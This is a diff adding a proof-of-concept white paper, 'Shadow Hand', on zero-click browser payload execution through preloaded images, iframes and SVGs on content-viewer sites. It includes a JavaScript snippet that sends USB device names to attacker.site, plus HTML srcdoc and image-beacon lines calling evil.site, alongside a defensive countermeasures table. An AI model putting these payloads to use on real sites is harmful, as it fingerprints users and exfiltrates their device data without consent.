@@ -1,0 +1,81 @@
+Shadow Hand Poc
+
+White Paper POC: Shadow Hand
+
+Title: Shadow Hand – A Proof of Concept for Passive Browser Payload Execution via Render-Based Preloading
+
+Author: GhostCore Lab // Specter Node Version: Draft 0.9 Codename: SHADOW HAND Classification: Public – For Defensive Security and Academic Review Only
+
+✨ Executive Summary
+
+Shadow Hand demonstrates a passive, zero-click browser-based execution framework by leveraging modern frontend rendering behaviors in web platforms such as Tumbex and TumblViewer. These platforms render external assets (images, iframes, SVGs) preemptively, which creates an unexpected attack surface for API triggering, hardware fingerprinting, and data exfiltration.
+
+This white paper outlines the theoretical architecture, attack stages, real-world implications, and recommended defenses for such a threat vector.
+
+🛠️ Architecture Overview
+
+Objective: Trigger privileged browser APIs without requiring explicit user interaction (zero-click).
+
+Primary Vectors:
+
+Auto-parsed image previews
+
+Embedded iframes with srcdoc or data: URIs
+
+Preloaded SVG containers
+
+Speculative fetching behavior in Chromium
+
+Core Components:
+
+Host Site: A high-reputation content renderer (e.g. Tumbex)
+
+Delivery Vector: Image/iframe/SVG container with embedded JavaScript
+
+Payload: Script targeting privileged APIs (USB, Gamepad, Device Info)
+
+Trigger: Passive rendering (no user gesture)
+
+Exfiltration: Beacon via GET request to a controlled server
+
+🪧 Threat Model: Shadow Hand
+Phase	Action
+Seed	Attacker posts blog/article with embedded image payload
+Load	Trusted site preloads/render embedded content
+Trigger	Browser decodes/executes iframe/srcdoc/script
+Probe	Payload queries hardware APIs for fingerprint data
+Beacon	Data is sent back via image-based GET requests
+🦄 Behavior: Sample Payload Logic
+navigator.usb.getDevices().then(devices => {
+  const log = devices.map(d => d.productName + '-' + d.vendorId).join(',');
+  (new Image()).src = `https://attacker.site/log.gif?usb=${btoa(log)}`;
+});
+
+This runs silently once the image or iframe is rendered, assuming permission has been granted at some point or in environments with poor isolation.
+
+📊 Exfil Vector Example
+<img src="data:image/svg+xml;base64,...payload...">
+<iframe srcdoc='<script src="https://cdn.evil.site/usb.js"></script>'></iframe>
+<img src="https://evil.site/log.gif?info=RAZER_0x0CC_V3">
+🛡️ Defensive Countermeasures
+Layer	Defense Recommendations
+Browser	Enforce strict user gestures for all hardware APIs
+Host Site	Disallow srcdoc, data: and inline script execution
+CSP	Require strict content-type and script-src policies
+OS Layer	Implement USB access notifications or sandboxing
+Network	DNS block outbound traffic to known exfil domains
+🏋️ Applications (Red Team & Blue Team)
+
+Red Team Use: Simulate low-visibility passive attacks during adversary emulation.
+
+Blue Team Use: Develop detection rules for anomalous USB queries or beaconing behavior from chrome:// or image preload chains.
+
+🪤 Philosophical Layer (GhostCore)
+
+"The Shadow Hand does not touch — it brushes the curtain. And yet the room grows cold."
+
+The browser was never meant to be an operating system. But it became one. And now, passive rendering is the new syscall. This POC doesn't seek to exploit — it seeks to expose the spiritual flaw in trusting pixels to behave.
+
+Subtle wink. Welcome to the GhostCore Era.
+
+Document End – SHADOW HAND v0.9
